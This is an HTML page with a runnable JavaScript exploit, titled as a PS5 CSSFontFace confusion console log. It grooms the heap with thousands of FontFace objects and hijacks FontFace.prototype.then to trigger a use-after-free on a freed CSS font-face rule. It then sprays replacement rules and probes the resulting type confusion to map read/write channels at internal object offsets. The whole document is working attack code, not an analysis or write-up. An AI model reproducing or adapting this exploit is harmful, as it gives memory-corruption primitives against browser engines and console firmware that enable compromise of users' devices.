<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>PS5 CSSFontFace Confusion – Full Console Log</title>
<style id="s">
@font-face{font-family:prepad;src:url(np.woff);unicode-range:U+E123}
@font-face{font-family:x;src:url(nx.woff);unicode-range:U+0042}
</style>
</head>
<body>
<div id="out" style="font-family:monospace;white-space:pre-wrap;padding:10px;color:#0f0;background:#000;"></div>
<script>
"use strict";

// ========== LOGGING HELPERS ==========
const O = document.getElementById('out');
function log(msg, color) {
    console.log(msg);
    const span = document.createElement('span');
    if (color) span.style.color = color;
    span.textContent = msg + '\n';
    O.appendChild(span);
    O.scrollTop = O.scrollHeight;
}
function ok(msg)  { log('  ✅ ' + msg, '#0f0'); }
function fl(msg)  { log('  ✘ ' + msg, '#f00'); }
function star(msg) { log('  ★ ' + msg + ' ★', '#ff0'); }
function section(title) { log('\n--- ' + title + ' ---', '#fff'); }

// ========== BINARY FONT HELPER ==========
const FB = 'd09GMgABAAAAAAJkAA4AAAAABiAAAAIQAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP0ZGVE0cGhwGYACCQggEEQgKcH0LCgABNgIkAxAEIAWEEAcyGy4FAI7Ctnlz5COJZMsihmWKh4f78Z573/0ZGIXRWLVZpRVNBz5LGmglcIJtH2hFs/L71vRPNg6FnRed2yOwAbJMJfRVCkhVAas6QCnP5701PYAm8AF8l8DegK66cR6mEGHAUS8K8ALFQCjz1m9GpK46tojEaUMI+PLzugVw1L1+g6Pdp10QoNuwKBKBQJW4q4V8mJ9xBx80vlmJDlJLBwDtADhxIz/D0Ya1YYmV/6ZePgIBgAmEBg1GEFgjBEZETYBSgpurYWj/ch78CyBaCUAkEgAQmj1O5W3E/1CCAu1o0I1+AIV5ERBV1dXSU+diLZ3nRV9OPep/9GPyZ/Ej398zrQyAl2Rh7bat/DBuWlu+rt026YeBG7HEWiTBtcafwuPKhODd1XFhmFr73R4rx+1LpKGZyEdolyDIR7hSoJlAAIAqpoBC8R6B0i5BIgS2SAC9niEApAChzzQCqc0uAo0ZFwhQ+vxCgBb9MYlAq744BSGqAxgjjBFIvVbQOKeKMuYfLSaEK7Yai2XguKmauX0HCg5t2NC0aubAChy/qmzUaj+jIBwDp8wtufXYHvxEVgIHtm05wG+yZ2mOGSQNC3Asy+sbTAq/FwbN6yCuJCftLedsSI0DzknNJsNUfOUqnng/9Fzes281/5JpNDqJaw3DWypomi41n5fDXAgJ/L/HCghqKARzIbLt1taqkzUt';
const FBb = (() => {
    const s = atob(FB), b = new Uint8Array(s.length);
    for (let i = 0; i < s.length; i++) b[i] = s.charCodeAt(i);
    return b;
})();
function mkBuf() { return new Uint8Array(FBb).buffer; }
function forceStyle() { void document.body.offsetTop; }

// ========== GLOBALS ==========
const sh = document.getElementById('s').sheet;
const keep = [], holes = [];
let trigger = null, uafFired = false;

// ========== PHASE 1: HEAP GROOMING ==========
section('PHASE 1: Heap Grooming');
log('Creating 4096 FontFace objects...');
for (let i = 0; i < 4096; i++) {
    try {
        const f = new FontFace('h_' + i, mkBuf(), {
            unicodeRange: 'U+E1' + (i % 16).toString(16),
            style: i % 2 === 0 ? 'normal' : 'italic',
            weight: String(100 + (i % 9) * 100)
        });
        document.fonts.add(f);
        holes.push(f);
    } catch(e) { fl('Error creating hole ' + i + ': ' + e.message); }
}
forceStyle();
log('Deleting every other hole to create gaps...');
for (let i = 1; i < holes.length; i += 2) {
    try { document.fonts.delete(holes[i]); } catch(e) {}
}
ok('Holes prepared: ' + holes.length);

log('Creating trigger FontFace...');
trigger = new FontFace('trigger', 'local(Helvetica)', { unicodeRange: 'U+0041' });
document.fonts.add(trigger);
void trigger.loaded; // activate
ok('Trigger ready');

log('Adding 48 padding rules...');
for (let i = 0; i < 48; i++) {
    try { sh.insertRule('@font-face{font-family:pad' + i + ';src:url(np' + i + '.woff);unicode-range:U+E000}', sh.cssRules.length); } catch(e) {}
}
forceStyle();
ok('Padding rules inserted');

log('Creating second stylesheet with 768 flush rules...');
const fst = document.createElement('style'); document.head.appendChild(fst);
const fsh = fst.sheet;
for (let i = 0; i < 768; i++) {
    try { fsh.insertRule('@font-face{font-family:fl' + i + ';src:url(nf' + i + '.woff);unicode-range:U+E000}', fsh.cssRules.length); } catch(e) {}
}
forceStyle();
ok('Flush rules created');

// ========== PHASE 2: UAF TRIGGER ==========
section('PHASE 2: UAF Trigger');
log('Overriding FontFace.prototype.then...');
Object.defineProperty(FontFace.prototype, 'then', {
    configurable: true,
    get: function() {
        if (this === trigger && !uafFired) {
            uafFired = true;
            log('  >> UAF trigger fired!');
            try {
                // Keep a reference to prevent early GC of the new FontFace
                const ck = new FontFace('ck', 'local(Helvetica)', { unicodeRange: 'U+E124' });
                document.fonts.add(ck);
                keep.push(ck);
                log('  >> Deleting rule[1] (x)...');
                sh.deleteRule(1); // FREE CSSFontFace for 'x'
                forceStyle();

                log('  >> Deleting all flush rules...');
                while (fsh.cssRules.length) { try { fsh.deleteRule(0); } catch(e) {} }
                forceStyle();

                log('  >> Deleting additional holes...');
                for (let i = 0; i < holes.length; i += 4) { try { document.fonts.delete(holes[i]); } catch(e) {} }
                forceStyle();
            } catch(e) { fl('  Error during deletion: ' + e.message); }

            // Memory pressure
            log('  >> Allocating memory pressure (4 x 128 x 8KB)...');
            for (let i = 0; i < 4; i++) {
                const temp = [];
                for (let j = 0; j < 128; j++) temp.push(new ArrayBuffer(8192));
            }

            // Spray 2048 CSSFontFace objects via insertRule
            log('  >> Spraying 2048 CSS rules (A_0 ... A_2047)...');
            for (let i = 0; i < 2048; i++) {
                try {
                    sh.insertRule('@font-face{font-family:A_' + i + ';src:local(Courier);font-weight:' +
                        (100 + (i % 9) * 100) + ';font-style:' + (i % 2 === 0 ? 'normal' : 'italic') +
                        ';unicode-range:U+0042}', sh.cssRules.length);
                } catch(e) {}
            }
            forceStyle();

            // Force font loading
            log('  >> Forcing font load with text "AB"...');
            try {
                const d = document.createElement('div');
                d.textContent = 'AB';
                d.style.cssText = 'position:absolute;left:-9999px;font:64px trigger;';
                document.body.appendChild(d);
                void d.offsetWidth;
            } catch(e) {}
            ok('UAF + spray complete');
        }
        return undefined; // non-callable
    }
});
log('Override installed');

// ========== PHASE 3: DETECT CONFUSION ==========
section('PHASE 3: Loading mixed fonts');
document.fonts.load('1em trigger, x', 'AB').then(function(faces) {
    log('load() resolved with ' + faces.length + ' faces');
    let aFamily = null, aFace = null;
    for (let i = 0; i < faces.length; i++) {
        log('  face[' + i + ']: family="' + faces[i].family + '"');
        if (faces[i].family && faces[i].family.indexOf('A_') === 0) {
            aFamily = faces[i].family;
            aFace = faces[i];
        }
    }
    if (!aFamily) {
        fl('No A_* family found – UAF may have failed.');
        return;
    }
    star('CONFUSION ACTIVE: ' + aFamily);
    keep.push(faces);

    // Find the CSS rule for this family
    let aIndex = -1;
    for (let i = 0; i < sh.cssRules.length; i++) {
        try {
            const r = sh.cssRules[i];
            if (r.type === 5 && r.style.getPropertyValue('font-family').indexOf(aFamily) !== -1) {
                aIndex = i; break;
            }
        } catch(e) {}
    }
    if (aIndex === -1) { fl('Cannot find matching CSSRule'); return; }
    const aRule = sh.cssRules[aIndex], aStyle = aRule.style;
    log('Found CSSRule at index ' + aIndex);

    // Quick liveness test
    aStyle.setProperty('font-weight', '700');
    forceStyle();
    if (String(aFace.weight) !== '700') {
        fl('Confusion died after first write – try again.');
        return;
    }
    ok('Confusion ALIVE – weight 700 -> ' + aFace.weight);

    // ========== PHASE 4: R/W CHANNEL PROBES ==========
    section('PHASE 4: R/W Channel Mapping');
    
    function probe(cssName, writeVal, faceProp, expectedOff, desc, type) {
        aStyle.setProperty(cssName, writeVal);
        forceStyle();
        const readVal = aFace[faceProp];
        const readStr = String(readVal), writeStr = String(writeVal);
        let passed = false;
        if (type === 'numeric') {
            const rn = parseFloat(readStr), wn = parseFloat(writeVal);
            if (!isNaN(rn) && !isNaN(wn) && rn === wn) passed = true;
            if (readStr.indexOf(writeStr) !== -1) passed = true;
        } else if (type === 'float') {
            const fv = parseFloat(readStr), wv = parseFloat(writeVal);
            if (!isNaN(fv) && !isNaN(wv) && Math.abs(fv - wv) < 0.01) passed = true;
        } else {
            if (readStr.indexOf(writeStr) !== -1) passed = true;
        }
        if (passed) {
            ok(desc + ' (' + expectedOff + ') -> ' + readStr);
        } else {
            fl(desc + ' (' + expectedOff + ') -> ' + readStr);
        }
        try { aStyle.removeProperty(cssName); } catch(e) {}
        forceStyle();
    }

    // 17 channels
    probe('font-weight', '100', 'weight', '0x88', 'weight:100', 'numeric');
    probe('font-weight', '200', 'weight', '0x88', 'weight:200', 'numeric');
    probe('font-weight', '300', 'weight', '0x88', 'weight:300', 'numeric');
    probe('font-weight', '400', 'weight', '0x88', 'weight:400', 'numeric');
    probe('font-weight', '500', 'weight', '0x88', 'weight:500', 'numeric');
    probe('font-weight', '600', 'weight', '0x88', 'weight:600', 'numeric');
    probe('font-weight', '700', 'weight', '0x88', 'weight:700', 'numeric');
    probe('font-weight', '800', 'weight', '0x88', 'weight:800', 'numeric');
    probe('font-weight', '900', 'weight', '0x88', 'weight:900', 'numeric');
    probe('font-family', 'testFamProbe', 'family', '0x20', 'family', 'string');
    probe('unicode-range', 'U+0000-007F', 'unicodeRange', '0x28', 'ranges', 'string');
    probe('font-feature-settings', '"test" 1', 'featureSettings', '0x40', 'featureSettings', 'string');
    probe('font-display', 'block', 'display', '0x58', 'display:block', 'enum');
    probe('font-display', 'swap', 'display', '0x58', 'display:swap', 'enum');
    probe('font-display', 'fallback', 'display', '0x58', 'display:fallback', 'enum');
    probe('font-display', 'optional', 'display', '0x58', 'display:optional', 'enum');
    probe('font-stretch', 'condensed', 'stretch', '0x88+4', 'width:condensed', 'string');
    probe('font-stretch', 'expanded', 'stretch', '0x88+4', 'width:expanded', 'string');
    probe('font-style', 'italic', 'style', '0x88+8', 'slope:italic', 'string');

    star('MAPPING COMPLETE');
    log('All probes finished. If 17 green, the confusion is fully mapped.', '#fff');
}).catch(function(err) {
    fl('load() rejected: ' + err.message);
    console.error(err);
});
</script>
</body>
</html>
